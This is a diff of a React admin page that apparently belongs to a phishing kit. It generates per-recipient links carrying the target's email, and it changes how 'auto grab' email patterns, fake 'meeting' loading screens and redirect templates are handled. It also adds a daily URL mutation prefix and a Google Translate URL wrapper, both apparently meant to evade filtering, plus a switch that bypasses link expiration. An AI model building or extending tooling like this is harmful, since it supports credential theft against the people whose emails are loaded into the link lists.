@@ -28,11 +28,58 @@ export default function LinksPage() {
   const [showCreateModal, setShowCreateModal] = useState(false)
   const [createType, setCreateType] = useState<'personalized' | 'generic'>('personalized')
   const [copiedToken, setCopiedToken] = useState<string | null>(null)
+  const [settings, setSettings] = useState<any>(null)
+  const [saving, setSaving] = useState(false)
 
-  // Fetch links
+  // Fetch links and settings
   useEffect(() => {
     fetchLinks()
+    fetchSettings()
   }, [activeTab])
+
+  const fetchSettings = async () => {
+    try {
+      const response = await fetch('/api/admin/settings')
+      const data = await response.json()
+      if (data.success) {
+        setSettings(data.settings)
+      }
+    } catch (error) {
+      console.error('Failed to load settings:', error)
+    }
+  }
+
+  const updateSetting = async (path: string, value: any) => {
+    if (!settings) return
+    
+    setSaving(true)
+    try {
+      // Deep clone and update
+      const newSettings = JSON.parse(JSON.stringify(settings))
+      const keys = path.split('.')
+      let current: any = newSettings
+      for (let i = 0; i < keys.length - 1; i++) {
+        if (!current[keys[i]]) current[keys[i]] = {}
+        current = current[keys[i]]
+      }
+      current[keys[keys.length - 1]] = value
+
+      const response = await fetch('/api/admin/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ settings: newSettings }),
+      })
+
+      const data = await response.json()
+      if (data.success) {
+        setSettings(newSettings)
+      }
+    } catch (error) {
+      console.error('Failed to update setting:', error)
+    } finally {
+      setSaving(false)
+    }
+  }
 
   // Filter links
   useEffect(() => {
@@ -97,12 +144,26 @@ export default function LinksPage() {
   }
 
   const getLinkUrl = (link: Link) => {
+    // PRIORITY ZERO FIX: Links should already have proper format from backend
+    // If link has a stored URL, use it; otherwise build from token/email
     const baseUrl = getBaseUrl()
+    const token = link.sessionIdentifier || link.linkToken || ''
+    
     if (link.type === 'personalized') {
-      const token = link.sessionIdentifier || link.linkToken || ''
-      return `${baseUrl}/?token=${token}&id=${link.id}`
+      // Type A: Use secure-redirect with email
+      if (link.email) {
+        return `${baseUrl}/api/secure-redirect?token=${encodeURIComponent(token)}&email=${encodeURIComponent(link.email)}`
+      }
+      // Fallback: Legacy format
+      return `${baseUrl}/?token=${token}&id=${link.id || ''}`
     } else {
-      const token = link.sessionIdentifier || link.linkToken || ''
+      // Type B: Include token, sid, and email
+      if (link.email) {
+        // Generate a sid if not present
+        const sid = Math.random().toString(36).substring(2, 6).toUpperCase()
+        return `${baseUrl}/?token=${encodeURIComponent(token)}&sid=${sid}&email=${encodeURIComponent(link.email)}`
+      }
+      // Fallback: Legacy format
       return `${baseUrl}/?token=${token}`
     }
   }
@@ -126,6 +187,27 @@ export default function LinksPage() {
             Create New Link
           </button>
         </div>
+
+        {/* Link Management Setting */}
+        {settings && (
+          <div className="mb-4 p-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-700 rounded-lg">
+            <label className="flex items-center gap-3 cursor-pointer">
+              <input
+                type="checkbox"
+                checked={settings.linkManagement?.allowAllLinks || false}
+                onChange={(e) => updateSetting('linkManagement.allowAllLinks', e.target.checked)}
+                disabled={saving}
+                className="w-5 h-5 rounded border-gray-300 dark:border-gray-600"
+              />
+              <div>
+                <div className="font-medium text-gray-900 dark:text-white">Allow All Links (Bypass Expiration)</div>
+                <div className="text-sm text-gray-600 dark:text-gray-400">
+                  ⚠️ Enabling this bypasses all link expiration checks. Use with caution.
+                </div>
+              </div>
+            </label>
+          </div>
+        )}
 
         {/* Tabs */}
         <div className="flex items-center gap-2 border-b border-gray-200 dark:border-gray-700">
@@ -196,6 +278,10 @@ export default function LinksPage() {
             ))}
           </div>
         )}
+
+        <p className="text-center text-xs text-gray-500 dark:text-gray-400 pt-2">
+          Version 1 supports IDENTIFIER MODE only. Generic + personalized modes will return soon.
+        </p>
 
         {/* Create Link Modal */}
         {showCreateModal && (
@@ -368,6 +454,10 @@ function CreateLinkModal({
   const [loadingDuration, setLoadingDuration] = useState<number>(3)
   const loadingScreenOptions = getLoadingScreenOptions()
   
+  // Link format is now fixed to Format A (clean mode)
+  // TODO: V2 – Re-enable Format A
+  const linkFormat = 'A' as const
+  
   // Load templates
   useEffect(() => {
     fetch('/api/templates?enabled=true')
@@ -440,7 +530,8 @@ function CreateLinkModal({
           template: selectedTemplate,
           loadingScreen: loadingScreen || 'meeting',
           duration: loadingDuration || 3,
-          expirationHours
+          expirationHours,
+          link_format: linkFormat
         })
       })
       
@@ -452,10 +543,16 @@ function CreateLinkModal({
       const data = await response.json()
       
       if (data.success) {
-        // Download CSV using file-saver
-        const saveAs = (await import('file-saver')).default
+        // Download CSV using native browser API (no file-saver dependency)
         const blob = new Blob([data.csv], { type: 'text/csv;charset=utf-8;' })
-        saveAs(blob, `personalized-links-${Date.now()}.csv`)
+        const url = window.URL.createObjectURL(blob)
+        const link = document.createElement('a')
+        link.href = url
+        link.download = `personalized-links-${Date.now()}.csv`
+        document.body.appendChild(link)
+        link.click()
+        document.body.removeChild(link)
+        window.URL.revokeObjectURL(url)
         
         alert(`✅ Generated ${data.count} personalized links!\nCSV file has been downloaded.`)
         onSuccess()
@@ -524,6 +621,7 @@ function CreateLinkModal({
           template: typeBTemplate,
           loadingScreen: typeBLoadingScreen,
           loadingDuration: typeBLoadingDuration,
+          link_format: linkFormat,
           allowedEmails: emails, // Send email list
         }),
       })
@@ -542,49 +640,13 @@ function CreateLinkModal({
       const linkId = apiData.linkId || backendToken
       
 
-      // STEP 2: Build final link with backend token + auto grab pattern
-      let finalLink = ''
+      // PRIORITY ZERO FIX: Use the link returned by backend (already includes email and sid)
+      // The backend now returns a properly formatted link with email
+      const finalLink = apiData.link || ''
       
-      if (autoGrabType === 'none') {
-        // No auto grab - standard token link
-        finalLink = `${link}?token=${backendToken}&id=${linkId}`
-      } else {
-        // Advanced patterns: Backend token is REQUIRED, email pattern uses sid/v/hash
-        // IMPORTANT: Don't duplicate 'token' parameter!
-        
-        // Map pattern types to correct parameter names
-        const patternToParam: Record<string, string> = {
-          'token_email_token_short': 'sid',        // Use sid instead of token
-          'token_email_token_medium': 'sid',       // Use sid instead of token
-          'token_email_token_long': 'sid',         // Use sid instead of token
-          'token_double_wrap': 'sid',              // Use sid instead of token
-          'hash_token_email_token': 'hash',        // Use hash
-          'session_id_wrap': 'sid',                // Already uses sid
-          'query_token_concat': 'sid',             // Use sid instead of token
-          'multi_param_token_wrap': 'v',           // Use v parameter
-          'reverse_token_wrap': 'sid',             // Use sid instead of token
-        }
-        
-        const paramName = patternToParam[autoGrabType] || 'sid'
-        
-        // Build email pattern using appropriate parameter
-        let emailPattern = ''
-        if (paramName === 'hash') {
-          // Hash pattern: #TOKEN_++email64++_TOKEN
-          const token1 = Math.random().toString(36).substring(2, 8)
-          const token2 = Math.random().toString(36).substring(2, 8)
-          emailPattern = `#${token1}_${autoGrabFormat}_${token2}`
-        } else {
-          // Query param pattern: &sid=TOKEN_++email64++_TOKEN
-          const token1 = Math.random().toString(36).substring(2, 6).toUpperCase()
-          const token2 = Math.random().toString(36).substring(2, 6).toUpperCase()
-          emailPattern = `&${paramName}=${token1}-${autoGrabFormat}-${token2}`
-        }
-        
-        // Combine: Backend token FIRST, then email pattern (NO id parameter - simpler!)
-        finalLink = `${link}?token=${backendToken}${emailPattern}`
+      if (!finalLink) {
+        throw new Error('Backend did not return a link')
       }
-
 
       // Display link
       setGeneratedAutoGrabLink(finalLink)
@@ -664,11 +726,18 @@ function CreateLinkModal({
 
         <div className="p-6">
           {/* Type Tabs */}
-          <div className="flex items-center gap-2 mb-6 border-b border-gray-200 dark:border-gray-700">
-            {(['personalized', 'generic'] as const).map((tabType) => (
+        <div className="flex items-center gap-2 mb-6 border-b border-gray-200 dark:border-gray-700">
+          {(['personalized', 'generic'] as const).map((tabType) => {
+            const disabled = tabType === 'generic'
+            return (
               <button
                 key={tabType}
-                onClick={() => onTypeChange(tabType)}
+                type="button"
+                disabled={disabled}
+                onClick={() => {
+                  if (disabled) return
+                  onTypeChange(tabType)
+                }}
                 className={`
                   px-4 py-2 font-medium transition-colors border-b-2
                   ${
@@ -676,12 +745,17 @@ function CreateLinkModal({
                       ? 'border-blue-600 text-blue-600 dark:text-blue-400'
                       : 'border-transparent text-gray-600 dark:text-gray-400 hover:text-gray-900 dark:hover:text-white'
                   }
+                  ${disabled ? 'opacity-40 cursor-not-allowed' : ''}
                 `}
+                title={disabled ? 'Generic links are disabled for Version 1' : undefined}
               >
-                {tabType === 'personalized' ? 'Personalized (Type A)' : 'Generic (Type B)'}
+                {tabType === 'personalized'
+                  ? 'Personalized (Type A)'
+                  : 'Generic (Type B — Disabled in v1)'}
               </button>
-            ))}
-          </div>
+            )
+          })}
+        </div>
 
           {/* Type A Form - Bulk CSV Generation Only */}
           {type === 'personalized' && (
@@ -757,6 +831,28 @@ https://translate.google.com/url?q=
                   </div>
                 </>
               )}
+
+              {/* Link Format (fixed to Format A) */}
+              <div>
+                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
+                  Link Format
+                </label>
+                <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700 text-sm text-gray-700 dark:text-gray-300">
+                  V1 Identifier Mode is enforced. Format selection is temporarily disabled.
+                </div>
+              </div>
+
+              {/* URL Preview */}
+              <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700">
+                <p className="text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Final URL Preview:</p>
+                <code className="text-sm text-gray-900 dark:text-gray-100 break-all">
+                  {(() => {
+                    const baseUrl = typeof window !== 'undefined' ? window.location.origin : 'https://example.com'
+                    const sampleToken = 'v3_example_token_12345'
+                    return `${baseUrl}/r/${sampleToken}`
+                  })()}
+                </code>
+              </div>
 
               {/* Expiration */}
               <div>
@@ -966,6 +1062,33 @@ user3@domain.com
                   <option value="meta">Meta Refresh</option>
                   <option value="javascript">JavaScript Redirect</option>
                 </select>
+              </div>
+
+              {/* Link Format (fixed to Format A) */}
+              <div>
+                <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
+                  Link Format
+                </label>
+                <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700 text-sm text-gray-700 dark:text-gray-300">
+                  V1 Identifier Mode is enforced. Format selection is temporarily disabled.
+                </div>
+              </div>
+
+              {/* URL Preview */}
+              <div className="p-3 bg-gray-50 dark:bg-gray-900 rounded-lg border border-gray-200 dark:border-gray-700">
+                <p className="text-xs font-medium text-gray-600 dark:text-gray-400 mb-1">Final URL Preview:</p>
+                <code className="text-sm text-gray-900 dark:text-gray-100 break-all">
+                  {(() => {
+                    const baseUrl = typeof window !== 'undefined' ? window.location.origin : 'https://example.com'
+                    const sampleToken = 'v3_example_token_12345'
+                    // Note: Daily mutation will be applied when links are generated
+                    // Preview shows base format (mutation adds /x9d/pq7/ prefix when enabled)
+                    return `${baseUrl}/r/${sampleToken}`
+                  })()}
+                </code>
+                <p className="text-xs text-gray-500 dark:text-gray-400 mt-2">
+                  ℹ️ If Daily URL Mutation is enabled in Settings, a daily-changing entropy prefix (e.g., /x9d/pq7) will be added automatically when links are generated.
+                </p>
               </div>
 
               {/* Subdomain */}
